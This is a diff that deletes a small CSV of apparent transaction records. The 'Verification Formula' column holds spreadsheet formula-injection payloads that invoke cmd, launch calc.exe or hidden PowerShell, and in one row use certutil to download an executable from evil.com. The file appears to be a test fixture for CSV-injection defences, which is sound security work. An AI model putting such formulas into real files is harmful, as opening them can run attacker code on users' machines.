@@ -1,5 +1,0 @@
-Transaction ID,Account Holder,Amount (USD),Status,Verification Formula
-TX-1001,John Doe,1500.00,Verified,"=cmd|'/c calc.exe'!A0"
-TX-1002,Jane Smith,2450.50,Pending,"+cmd|'/c powershell.exe -w hidden -c calc.exe'!A0"
-TX-1003,Acme Corp,99000.00,Flagged,"-cmd|'/c certutil -urlcache -split -f http://evil.com/x.exe'!A0"
-TX-1004,Target User,500.00,Review,"@SUM(1+1)*cmd|'/c calc'!A0"
